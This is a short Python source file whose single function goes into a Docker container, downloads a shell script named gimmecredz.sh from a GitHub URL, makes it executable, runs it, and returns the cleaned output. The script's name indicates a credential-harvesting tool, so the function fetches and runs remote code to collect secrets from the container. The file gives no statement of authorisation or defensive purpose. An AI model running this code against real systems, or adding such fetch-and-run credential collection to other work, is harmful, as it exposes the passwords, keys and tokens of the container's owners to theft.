import subprocess
import re

def search_docker(container_id):
    temp = subprocess.Popen(['docker', 'exec', '-ti', container_id, 'wget', 'https://raw.githubusercontent.com/0xmitsurugi/gimmecredz/master/gimmecredz.sh'], stdout = subprocess.PIPE, shell=False) 
    output = temp.communicate()[0].decode("utf-8")
    temp = subprocess.Popen(['docker', 'exec', '-ti', container_id, 'chmod', '+x', 'gimmecredz.sh'], stdout = subprocess.PIPE, shell=False) 
    output = temp.communicate()[0].decode("utf-8")
    temp = subprocess.Popen(['docker', 'exec', '-ti', container_id, 'bash', 'gimmecredz.sh'], stdout = subprocess.PIPE, shell=False)
    output = temp.communicate()[0].decode("utf-8")
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    result = ansi_escape.sub('', output)
    return result